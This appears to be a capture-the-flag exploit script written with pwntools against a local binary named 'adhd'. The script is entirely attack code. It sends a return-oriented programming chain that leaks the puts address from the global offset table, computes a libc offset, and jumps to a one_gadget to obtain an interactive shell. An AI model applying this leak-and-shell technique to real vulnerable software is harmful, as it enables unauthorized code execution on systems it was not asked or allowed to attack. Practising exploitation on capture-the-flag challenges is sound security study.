from pwn import *

p = process("./adhd")

p.recvuntil(":\n")
p.send(p64(0x4006a3) + p64(0x600fd8))
p.send(p64(0x4004b0))
p.sendline(p64(0x4005d6))

puts_leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))

print("{:#x}".format(puts_leak))

p.recvuntil(":\n")
gdb.attach(p)
p.sendline(p64(puts_leak - 0x809c0 + 0x4f2c5))


p.interactive()
